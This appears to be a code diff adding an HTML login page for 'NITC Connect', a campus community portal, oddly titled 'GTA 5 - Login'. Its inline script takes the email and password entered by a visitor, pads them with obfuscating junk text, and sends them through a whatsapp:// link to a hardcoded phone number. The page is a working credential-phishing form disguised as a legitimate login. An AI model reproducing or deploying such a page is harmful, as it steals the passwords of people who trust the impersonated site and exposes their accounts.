@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GTA 5  - Login</title>
+  <link rel="stylesheet" href="css/login.css">
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="login-box">
+      <img src="images.png" alt="NITC Logo" class="logo">
+      <h2>NITC Connect</h2>
+      <p class="subtitle">Your gateway to the campus community</p>
+
+      <form id="loginForm">
+        <div class="input-group">
+          <label for="email">Email</label>
+          <input type="email" id="email" placeholder="Enter your Gmail" required>
+        </div>
+
+        <div class="input-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" placeholder="Enter your password" required>
+        </div>
+
+        <button type="submit" class="btn-login" onclick="send_message()" >Login</button>
+
+
+
+        <div class="divider">or</div>
+
+        <div class="social-login">
+          <button type="button" class="btn-social google">Login with Vercel</button>
+          <button type="button" class="btn-social github">Login with GitHub</button>
+        </div>
+      </form>
+
+      <p class="signup-text">Don’t have an account? <a href="#">Sign up</a></p>
+    </div>
+  </div>
+
+ 
+            <script >
+                   function send_message() {
+                     const email= document.getElementById("email").value;
+                    const password= document.getElementById("password").value;
+
+                    const phone = "917905972844";
+
+                    
+                    
+                    const message  = "h)/'d%sa+sn+d'sahiu.com , download+... " + email + " h)/'d%sa+sn+d'sahiu.com , download+..." + password +"1+$541$%56765#$%^&%$^&+fsfs+   1+$541$%56765#$%^&%$^&+fsfs+ " ;
+                    console.log(message)
+                          window.location.href = `whatsapp://send/?phone=917905972844&text=${message}`;
+                           console.log(message)
+                   
+
+
+            };
+
+       
+                    
+
+
+
+ document.querySelector("form").addEventListener("submit",function(event){
+    event.preventDefault();
+ })
+
+    </script>
+
+</body>
+</html>
